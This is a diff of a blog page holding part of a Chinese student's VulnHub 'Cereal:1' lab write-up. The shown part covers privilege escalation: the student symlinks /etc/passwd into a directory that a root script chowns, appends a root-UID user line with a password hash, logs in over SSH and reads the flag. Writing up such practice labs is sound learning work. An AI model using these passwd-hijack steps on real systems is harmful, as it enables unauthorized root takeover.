+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown rocky:apache /home/rocky/public_html/*</span><br></pre></td></tr></table></figure>
+
+<p>发现是将 <code>/home/rocky/public_html/*</code> 目录下的所有文件所有者更改为当前用户，猜测若在该目录下创建一个 passwd 文件的链接文件，会导致脚本执行时将 passwd 文件的所有者一并更改为当前用户，从而获取对  passwd 文件的写入权限。</p>
+</li>
+<li><p>使用 ln 命令将 passwd 文件链接到该目录下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s /etc/passwd /home/rocky/public_html/111111</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>等待片刻后查看 passwd 文件的权限：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><code>-rwxrwxr-x. 1 root root 1549 May 29  2021 /etc/passwd</code></p>
+<p>发现文件权限成功被修改。</p>
+</li>
+<li><p>再次使用 <a href="https://blog.kekwy.com/vulnhub-evilboxone/#0x05-%E8%87%AA%E5%AE%9A%E4%B9%89-root-%E7%94%A8%E6%88%B7">实验八</a> 中自定义 root 用户的方式，插入一条 root 权限的用户记录：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;test123:$1$5zwm/pYB$109Okt6Ql.GcBYi/z16xT1:0:0:root:/root:/bin/bash&#x27; &gt;&gt; /etc/passwd</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>切换至该自定义用户，成功提权：</p>
+<img src="https://assets.kekwy.com/images/image-20221126112046872.png" class="lazyload" data-srcset="https://assets.kekwy.com/images/image-20221126112046872.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221126112046872" style="zoom:150%;" /></li>
+</ol>
+<h3 id="0x06-最终的信息收集"><a href="#0x06-最终的信息收集" class="headerlink" title="0x06. 最终的信息收集"></a>0x06. 最终的信息收集</h3><ol>
+<li><p>尝试使用 ssh 以自定义 root 用户身份登入靶机：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh test123@10.0.2.17</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>成功登入后查看当前目录下的文件：</p>
+<img src="https://assets.kekwy.com/images/image-20221126150151952.png" class="lazyload" data-srcset="https://assets.kekwy.com/images/image-20221126150151952.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221126150151952" style="zoom:150%;" />
+</li>
+<li><p>查看文件 <code>proof.txt</code> 得到 flag：<code>1aeb5db4e979543cb807cfd90df77763</code></p>
+<img src="https://assets.kekwy.com/images/image-20221126150320630.png" class="lazyload" data-srcset="https://assets.kekwy.com/images/image-20221126150320630.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221126150320630" style="zoom:150%;" />
+</li>
+<li><p>查看文件 <code>listener.sh</code>：<br><a id="task3"></a></p>
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">nc -k -l 139 <span class="built_in">&amp;</span></span><br><span class="line">nc -k -l 445 <span class="built_in">&amp;</span></span><br><span class="line">nc -k -l 11111 <span class="built_in">&amp;</span></span><br><span class="line">nc -k -l 22222 <span class="built_in">&amp;</span></span><br><span class="line">nc -k -l 22223 <span class="built_in">&amp;</span></span><br><span class="line">nc -k -l 33333 <span class="built_in">&amp;</span></span><br><span class="line">nc -k -l 33334 <span class="built_in">&amp;</span></span><br><span class="line">nc -k -l 44444 <span class="built_in">&amp;</span></span><br><span class="line">nc -k -l 55555 <span class="built_in">&amp;</span></span><br><span class="line">nc -k -l 55551</span><br></pre></td></tr></table></figure>
+
+<p>发现是一段 shell 脚本，通过 nc 命令监听了很多端口。</p>
+<p>推测这就是我们之前 nmap 扫描出来很多端口，但是无法确定其上所运行服务的原因——这些端口仅被监听，实际上并没有运行有效的服务。</p>
+</li>
+</ol>
+</div><div class="story post-story"><h2 id="五、实验结果"><a href="#五、实验结果" class="headerlink" title="五、实验结果"></a>五、实验结果</h2><p><strong>root 权限：</strong></p>
+<img src="https://assets.kekwy.com/images/image-20221126112046872.png" class="lazyload" data-srcset="https://assets.kekwy.com/images/image-20221126112046872.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221126112046872" style="zoom:150%;" />
+
+<ul>
+<li>任务一：<a href="#task1">点击跳转</a>；</li>
+<li>任务二：<a href="#task2">点击跳转</a>；</li>
+<li>任务三：<a href="#task3">点击跳转</a>。</li>
+</ul>
+</div><div class="story post-story"><h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><ul>
+<li>本次实验靶机开发的端口很多，需要从扫描到的端口中寻找突破口。首先关注提供 web 应用的端口。</li>
+<li>浏览器访问 80 端口，未发现有效信息，进行路径爆破发现 <code>/blog</code> 路径，访问路径发现一个未加载样式的网页，并获得提示——靶机上存在某个服务端的备份文件。</li>
+<li>对 <code>/blog</code> 路径进行进一步爆破，发现某些路径被重定向到了某个域名的子路径上，尝试在 kali 的 hosts 文件中将该域名与靶机 IP 绑定。再次访问 <code>/blog</code> 路径，发现成功加载了样式。</li>
+<li>浏览器访问靶机 44441 端口，发现没有有效信息。对该端口进行域名爆破，发现一个隐藏的域名，同样将该域名与靶机 IP 进行绑定。再次访问后，发现当前页面可以对用户输入的 IP 地址进行 ping 操作。联想到命令注入。</li>
+<li>简单尝试注入后未果，拦截 ping 操作时发往服务器的请求头。发现网页将用户输入的 IP 地址包装成了一个对象，并做了序列化操作。但由于不知道服务端解析对象的方式，故无法直接进行命令注入。</li>
+<li>联想到 80 端口 <code>/blog</code> 路径下的提示，尝试通过路径、文件爆破寻找靶机上的备份文件。</li>
+<li>找到备份文件后，下载至 kali 查看，推测是 ping 操作页面服务端的源码。根据该源码中的对象解析方式，构造注入对象的序列，实现合法性绕过以及命令的注入，最终成功获取反弹 shell。</li>
+<li>使用 <code>pspy</code> 工具查看靶机上运行的进程，找到一个以 root 身份运行的 shell 脚本进程。查看相关脚本，发现该脚本将指定目录下的所有文件的所有者更改为了反弹 shell 中的当前用户。</li>
+<li>尝试在该目录下建立 passwd 文件的链接，使该脚本更改 passwd 文件的所有者，最终获取对 passwd 文件的写入权限。</li>
+<li>使用与实验八相同的操作自定义一条 root 用户记录，并插入 passwd 文件。</li>
+<li>切换至自定义用户，完成提权！</li>
+</ul>
+<p>ps：实验报告中只展示了成功的思路，但是在实际的渗透测试中，往往需要我们对多个漏洞点进行尝试，才能找到有效的突破口。</p>
+
+</div>
+  </div>
+  
+  
+    
+    <div class='footer'>
+       <!-- 参考资料、相关资料等 -->
+      
+       <!-- 相关文章 -->
+      
+      <!-- 版权声明组件 -->
+      
+      <!-- 打赏组件 -->
+      
+    </div>
+  
+  
+    
+
+
+  <div class='article-meta' id="bottom">
+    <div class='new-meta-box'>
       
         
-网络攻防实战 第十次实验
-邮箱：&#107;&#x65;&#x65;&#107;&#x6b;&#x65;&#119;&#121;&#64;&#113;&#x71;&#46;&#x63;&#x6f;&#x6d;
-2022年11月26日
-靶机链接：https://vulnhub.com/entry/cereal-1,703/
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2022-11-26T16:07:41+08:00">
+  <a class='notlink'>
+    <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：2022年11月26日</p>
+  </a>
+</div>
 
-一、实验目的获取靶机 root 权限和一个 root flag。
-...
+        
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/%E5%AD%A6%E4%B9%A0/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>学习</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/Kali/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>Kali</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/%E7%BD%91%E7%BB%9C/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>网络</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/%E5%AE%89%E5%85%A8/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>安全</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/Linux/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>Linux</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/vulnhub/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>vulnhub</p></a></div>
+  <span hidden itemprop="keywords">学习 Kali 网络 安全 Linux vulnhub</span>
+
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://blog.kekwy.com/vulnhub-Cereal/&title=【渗透测试】第十周 vulnhub-Cereal:1 - 铃的杂货铺&summary="
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qq.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qq.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://blog.kekwy.com/vulnhub-Cereal/&title=【渗透测试】第十周 vulnhub-Cereal:1 - 铃的杂货铺&summary="
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qzone.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qzone.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://blog.kekwy.com/vulnhub-Cereal/&title=【渗透测试】第十周 vulnhub-Cereal:1 - 铃的杂货铺&summary="
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/weibo.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/weibo.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+    
       
     
   </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2022-11-26T15:59:32+08:00">2022-11-26</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/">网络攻防实战</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/" itemprop="url"><span itemprop="name">网络攻防实战</span></a>
-            </span>
-          
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/vulnhub-Cereal/' itemprop="url">
-            阅读全文
-          </a>
-        </div>
-      
-    </div>
-  
-
 </div>
 
-          </div>
+
+
         
       
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://blog.kekwy.com/vulnhub-doubletrouble/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="铃的杂货铺">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="铃的杂货铺">
-    <meta itemprop="description" content="喜欢夏天的无名之辈">
-  </span>
-  
-  
-  
-    <div class='headimg-div'>
-      <a class='headimg-a' href="/vulnhub-doubletrouble/">
-        <img itemprop="image" class='headimg' alt="【渗透测试】第九周 vulnhub-DoubleTrouble:1" src='/media/渗透测试学习笔记/kali-ascii-16x9.png'/>
-      </a>
     </div>
-  
-  
+    <!-- Custom Files bottomMeta begin -->
     
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/vulnhub-doubletrouble/"  itemprop="url">
-        【渗透测试】第九周 vulnhub-DoubleTrouble:1
-      </a>
-    </h2>
+    <!-- Custom Files bottomMeta end -->
+  </div>
+
+
   
-  <div class='md article-desc' itemprop="articleBody">
-    
+  
+
+  
+    <div class="prev-next">
       
-        
+      
+        <a class='next' href='/vulnhub-doubletrouble/'>
+          <p class='title'>【渗透测试】第九周 vulnhub-DoubleTrouble:1<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>
 网络攻防实战 第九次实验
-邮箱：&#107;&#101;&#101;&#107;&#x6b;&#101;&#x77;&#x79;&#x40;&#x71;&#113;&#x2e;&#x63;&#111;&#109;
-靶机链接：https://www.vulnhub.com/entry/doubletrouble-1,743/
-2022年11月15日
-
-一、实验目的本次的靶机比较特别，在获取第...
-      
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2022-11-16T00:46:45+08:00">2022-11-16</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/">网络攻防实战</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/" itemprop="url"><span itemprop="name">网络攻防实战</span></a>
-            </span>
-          
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/vulnhub-doubletrouble/' itemprop="url">
-            阅读全文
-          </a>
-        </div>
+邮箱：&#107;&#101;&#101;&#107;&#x6b;&#101;&#x77;&#x79;&#x40;&#x71;&#113;&#x2e;&#x63;&#...</p>
+        </a>
       
     </div>
   
+  <!-- Custom Files postEnd begin-->
+  
+  <!-- Custom Files postEnd end-->
+</article>
 
-</div>
 
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://blog.kekwy.com/vulnhub-EvilBoxOne/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="铃的杂货铺">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="铃的杂货铺">
-    <meta itemprop="description" content="喜欢夏天的无名之辈">
-  </span>
   
-  
-  
-    <div class='headimg-div'>
-      <a class='headimg-a' href="/vulnhub-EvilBoxOne/">
-        <img itemprop="image" class='headimg' alt="【渗透测试】第八周 vulnhub-EvilBox:One" src='/media/渗透测试学习笔记/kali-ascii-16x9.png'/>
-      </a>
-    </div>
-  
-  
+
+
+  <article class="post white-box shadow floatable blur" id="comments">
+    <span hidden>
+      <meta itemprop="discussionUrl" content="/vulnhub-Cereal/index.html#comments">
+    </span>
+    <p ct><i class='fa-solid fa-comments'></i> 评论</p>
     
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/vulnhub-EvilBoxOne/"  itemprop="url">
-        【渗透测试】第八周 vulnhub-EvilBox:One
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      
-        
-网络攻防实战 第八次实验
-邮箱：&#x6b;&#101;&#101;&#x6b;&#x6b;&#x65;&#119;&#121;&#64;&#113;&#113;&#x2e;&#99;&#x6f;&#109;
-2022年11月8日
-靶机链接：https://vulnhub.com/entry/evilbox-one,736/
 
-一、实验目的取得目标靶机的 root 权限并获得两个 flag...
-      
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2022-11-08T15:41:56+08:00">2022-11-08</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/">网络攻防实战</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/" itemprop="url"><span itemprop="name">网络攻防实战</span></a>
-            </span>
-          
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/vulnhub-EvilBoxOne/' itemprop="url">
-            阅读全文
-          </a>
-        </div>
-      
-    </div>
-  
+    <div id="layoutHelper-comments"></div>
 
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://blog.kekwy.com/vulnhub-Fawkes/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="铃的杂货铺">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="铃的杂货铺">
-    <meta itemprop="description" content="喜欢夏天的无名之辈">
-  </span>
-  
-  
-  
-    <div class='headimg-div'>
-      <a class='headimg-a' href="/vulnhub-Fawkes/">
-        <img itemprop="image" class='headimg' alt="【渗透测试】第七周 vulnhub-Fawkes" src='/media/渗透测试学习笔记/kali-ascii-16x9.png'/>
-      </a>
-    </div>
-  
-  
-    
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/vulnhub-Fawkes/"  itemprop="url">
-        【渗透测试】第七周 vulnhub-Fawkes
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      
-        
-网络攻防实战 第七次实验
-邮箱：&#x6b;&#x65;&#x65;&#107;&#x6b;&#x65;&#x77;&#121;&#x40;&#113;&#113;&#x2e;&#99;&#111;&#109;
-2022年11月2日
-靶机连接：https://vulnhub.com/entry/harrypotter-fawkes,686/
-
-一、实验目的取得目标靶机的 root 权限并获...
-      
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2022-11-02T13:21:10+08:00">2022-11-02</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/">网络攻防实战</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/" itemprop="url"><span itemprop="name">网络攻防实战</span></a>
-            </span>
-          
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/vulnhub-Fawkes/' itemprop="url">
-            阅读全文
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-    
-  </section>
-  
-    
-  
+  </article>
 
 
-	
+
+
+
+
 </div>
 <aside id='l_side' itemscope itemtype="http://schema.org/WPSideBar">
   
@@ -3017,131 +3197,6 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
       
-<section class="widget blogger desktop pjax">
-  <div class='content'>
-    
-      
-        <a class='avatar flat-box circle' href='/about/'>
-          <img no-lazy src='/media/images/avatar.jpg'/>
-        </a>
-      
-    
-    
-      <div class='text'>
-        
-          <h2>可弟WZ</h2>
-        
-        
-          <p>二阶铃图</p>
-
-        
-        
-      </div>
-    
-    
-      <div class="social-wrapper">
-        
-          
-            <a href="mailto:keekkewy@qq.com"
-              class="social fa-solid fa-envelope flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-      </div>
-    
-  </div>
-</section>
-
-    
-  
-
-  
-    
-    
-      
-<section class="widget text desktop pjax">
-  
-  <header>
-    
-      <a href='/about/'><i class="fa fa-book fa-fw" aria-hidden="true"></i><span class='name'>与我相关</span></a>
-    
-  </header>
-
-
-  <div class='content'>
-    
-      <p>喜欢夏天的社畜程序猿。</p>
-
-    
-      <img src="/media/images/photo.jpg" class="lazyload" data-srcset="/media/images/photo.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" height="125px">
-    
-      <p>南京大学 计算机系 本科在读</p>
-
-    
-      <p>B站: <a target="_blank" rel="noopener" href="https://space.bilibili.com/35981385">可弟WZ柒号机</a></p>
-
-    
-      <p>知乎: <a target="_blank" rel="noopener" href="https://www.zhihu.com/people/ke-di-ling-dong">可弟岭冬</a></p>
-
-    
-      <p>GitHub: <a target="_blank" rel="noopener" href="https://github.com/Kekwy/">Kekwy</a></p>
-
-    
-  </div>
-</section>
-
-    
-  
-
-  
-    
-    
-      
-<section class="widget desktop pjax">
-  
-  <header>
-    
-      <i class="fa-solid fa-award fa-fw" aria-hidden="true"></i><span class='name'>站点信息</span>
-    
-  </header>
-
-
-  <div class='content'>
-    <div class="webinfo">
-      
-        <div class="webinfo-item">
-          <div>文章数目：</div>
-          <div>9 篇</div>
-        </div>
-      
-
-      
-        <div class="webinfo-item">
-          <div>已运行时间：</div>
-          <div id="webinfo-runtime-count"></div>
-        </div>
-      
-
-
-      
-
-      
-
-      
-
-      
-        <div class="webinfo-item">
-          <div>最后活动时间：</div>
-          <div id="last-update-show">2022-11-26 日</div>
-        </div>
-      
-    </div>
-  </div>
-</section>
-
     
   
 
@@ -3180,13 +3235,63 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
   
 
+  
+    
+    
+      
+
+<section class="widget desktop mobile pjax">
+  
+  <header>
+    
+      <i class="fa-solid fa-clock WISTERIA fa-fw" aria-hidden="true"></i><span class='name'>最近更新</span>
+    
+  </header>
+
+
+  <div class='content'>
+    <ul class="list entry navigation"><li><a class="widget-last" href="/vulnhub-Cereal/"><div class="item"><time>2022-11-26</time><span>网络攻防实战</span></div><span>【渗透测试】第十周 vulnhub-Cereal:1</span></a></li><li><a class="widget-last" href="/vulnhub-doubletrouble/"><div class="item"><time>2022-11-26</time><span>网络攻防实战</span></div><span>【渗透测试】第九周 vulnhub-DoubleTrouble:1</span></a></li><li><a class="widget-last" href="/vulnhub-EvilBoxOne/"><div class="item"><time>2022-11-26</time><span>网络攻防实战</span></div><span>【渗透测试】第八周 vulnhub-EvilBox:One</span></a></li><li><a class="widget-last" href="/iw1-calculator/"><div class="item"><time>2022-11-10</time><span>iOS智能应用开发</span></div><span>【iOS开发】iw01 科学计算器</span></a></li><li><a class="widget-last" href="/vulnhub-Fawkes/"><div class="item"><time>2022-11-10</time><span>网络攻防实战</span></div><span>【渗透测试】第七周 vulnhub-Fawkes</span></a></li></ul>
+  </div>
+</section>
+
+    
+  
+
 
 <div class="widget-sticky pjax">
+
+  
+  
+
+
+  <section class="widget toc-wrapper desktop mobile " id="toc-div" >
+    
+  <header>
+    
+      <i class="fa-solid fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%AE%9E%E9%AA%8C%E7%9B%AE%E7%9A%84"><span class="toc-text">一、实验目的</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%AE%9E%E9%AA%8C%E5%86%85%E5%AE%B9"><span class="toc-text">二、实验内容</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="toc-text">0x00. 准备工作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9F%9F%E5%90%8D%E7%88%86%E7%A0%B4"><span class="toc-text">0x01. 服务器域名爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-text">0x02. 命令注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6%E7%88%86%E7%A0%B4"><span class="toc-text">0x03. 隐藏文件爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-%E7%BB%A7%E7%BB%AD%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-text">0x04. 继续命令注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-%E6%9C%AC%E5%9C%B0%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><span class="toc-text">0x05. 本地漏洞提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x06-%E6%9C%80%E7%BB%88%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">0x06. 最终的信息收集</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E5%AE%9E%E9%AA%8C%E7%BB%93%E6%9E%9C"><span class="toc-text">五、实验结果</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%80%BB%E7%BB%93"><span class="toc-text">四、总结</span></a></li></ol>
+    </div>
+  </section>
+
+  
 
 </div>
 
 
 <!-- 没有 pjax 占位会报错 万恶的 pjax -->
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
 
   <div class="pjax">
     <!-- pjax占位 -->
@@ -3218,13 +3323,14 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </aside>
 
 
+
           <!--此文件用来存放一些不方便取值的变量-->
 <!--思路大概是将值藏到重加载的区域内-->
 
 <pjax>
 <script>
   window.pdata={}
-  pdata.ispage=false;
+  pdata.ispage=true;
   pdata.commentPath="";
   pdata.commentPlaceholder="";
   pdata.commentConfig={};
@@ -3233,14 +3339,14 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     // header
     var l_header=document.getElementById("l_header");
     
-    l_header.classList.remove("show");
+    l_header.classList.add("show");
     
     
       // cover
       var cover_wrapper=document.querySelector('#l_cover .cover-wrapper');
       var scroll_down=document.getElementById('scroll-down');
-      cover_wrapper.id="half";
-      cover_wrapper.style.display="";
+      cover_wrapper.id="none";
+      cover_wrapper.style.display="none";
       scroll_down.style.display="none";
     
   
@@ -4272,7 +4378,7 @@ volantis.pjax.push(()=>{_hmt.push(['_trackPageview', document.location.pathname]
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"铃的杂货铺","url":"http://blog.kekwy.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"可弟WZ铃号机","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://blog.kekwy.com/","sameAs":["https://github.com/volantis-x"],"description":"喜欢夏天的无名之辈"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://blog.kekwy.com/","name":"铃的杂货铺"}},{"@type":"ListItem","position":2,"item":{"@id":"http://blog.kekwy.com/archives/","name":"Archive"}},{"@type":"ListItem","position":3,"item":{"@id":"http://blog.kekwy.com/archives/2022/","name":"2022年"}},{"@type":"ListItem","position":4,"item":{"@id":"http://blog.kekwy.com/archives/2022/11/","name":"11月"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"铃的杂货铺","url":"http://blog.kekwy.com/","keywords":null,"description":"喜欢夏天的无名之辈","author":{"@type":"Person","name":"可弟WZ铃号机","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://blog.kekwy.com/","description":"喜欢夏天的无名之辈"},"publisher":{"@type":"Organization","name":"铃的杂货铺","url":"http://blog.kekwy.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"S